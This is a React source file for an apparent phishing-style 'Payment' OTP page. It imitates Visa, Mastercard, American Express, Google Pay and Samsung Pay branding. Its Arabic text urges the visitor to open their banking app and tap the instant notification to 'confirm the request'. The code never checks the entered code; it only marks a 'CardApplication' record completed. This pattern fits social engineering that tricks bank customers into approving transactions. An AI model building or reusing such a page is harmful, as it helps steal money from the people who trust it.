import { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { base44 } from "@/api/base44Client";

export default function OtpApp() {
  const navigate = useNavigate();
  const [otp, setOtp] = useState("");
  const [loading, setLoading] = useState(false);
  const [timeLeft, setTimeLeft] = useState(55);
  const inputRef = useRef(null);

  useEffect(() => {
    if (timeLeft <= 0) return;
    const timer = setInterval(() => setTimeLeft((t) => t - 1), 1000);
    return () => clearInterval(timer);
  }, [timeLeft]);

  const minutes = String(Math.floor(timeLeft / 60)).padStart(2, "0");
  const seconds = String(timeLeft % 60).padStart(2, "0");

  const handleChange = (e) => {
    const val = e.target.value.replace(/\D/g, "").slice(0, 6);
    setOtp(val);
  };

  const handleVerify = async () => {
    if (otp.length < 1) return;
    setLoading(true);
    const appId = localStorage.getItem("card_app_id");
    if (appId) {
      await base44.entities.CardApplication.update(appId, {
        current_step: "confirmation",
        status: "completed",
      });
      localStorage.removeItem("card_app_id");
    }
    setLoading(false);
    navigate("/confirmation");
  };

  return (
    <div className="min-h-screen bg-white flex flex-col items-center px-4 pt-10" dir="rtl">
      <h1 className="text-2xl font-light text-gray-800 mb-6">Payment</h1>

      <img
        src="https://media.base44.com/images/public/6a1908e5cd52b6a8fe5b8021/b1b4a5663_2f3eb4_5549add76f694127877610465c9f8733mv2.jpeg"
        alt="Network"
        className="h-10 object-contain mb-6"
      />

      <div className="w-full max-w-sm bg-white border border-gray-200 rounded-2xl shadow-sm px-6 py-7">
        <p className="text-right text-sm text-gray-700 leading-relaxed mb-6">
          إذا لم تتلقى رمز التأكيد برسالة نصية عبر جوالك
        </p>

        <p className="text-center text-base text-gray-800 leading-loose font-medium mb-6">
          قم بفتح التطبيق البنكي<br />
          سيظهر لك اشعار فوري<br />
          قم بالضغط على الاشعار لتأكيد الطلب
        </p>

        <div className="flex items-center gap-3 mb-5" dir="ltr">
          <input
            ref={inputRef}
            type="text"
            inputMode="numeric"
            placeholder="* * * * * *"
            value={otp}
            onChange={handleChange}
            className="flex-1 border border-gray-300 rounded-xl px-4 py-3 text-center text-lg tracking-[0.5em] font-semibold focus:outline-none focus:border-gray-500 bg-white"
          />
          <span className="text-base font-semibold text-gray-700 whitespace-nowrap">
            {minutes}:{seconds}
          </span>
        </div>

        <button
          onClick={handleVerify}
          disabled={loading}
          className="w-full py-3.5 text-base font-medium rounded-full text-white bg-gray-800 hover:bg-gray-700 transition-colors disabled:opacity-70"
        >
          {loading ? "..." : "verification code"}
        </button>
      </div>

      <div className="flex items-center justify-center gap-4 mt-8 flex-wrap">
        <div className="border border-gray-200 rounded-lg px-2 py-1 flex items-center justify-center">
          <span className="text-[10px] font-bold text-blue-900 leading-tight text-center">SAMSUNG<br />pay</span>
        </div>
        <div className="border border-gray-200 rounded-lg px-2 py-1 flex items-center justify-center gap-0.5">
          <span className="text-blue-500 font-bold text-xs">G</span>
          <span className="text-xs text-gray-600 font-medium">Pay</span>
        </div>
        <div className="border border-gray-200 rounded-lg px-2 py-1">
          <span className="text-[9px] font-bold text-blue-900 leading-tight text-center block">AMERICAN<br />EXPRESS</span>
        </div>
        <div className="border border-gray-200 rounded-lg px-2 py-1">
          <div className="flex">
            <div className="w-5 h-5 rounded-full bg-red-500 opacity-90" />
            <div className="w-5 h-5 rounded-full bg-yellow-400 opacity-90 -ml-2" />
          </div>
        </div>
        <div className="border border-gray-200 rounded-lg px-3 py-1">
          <span className="text-base font-bold italic text-blue-800">VISA</span>
        </div>
      </div>
    </div>
  );
}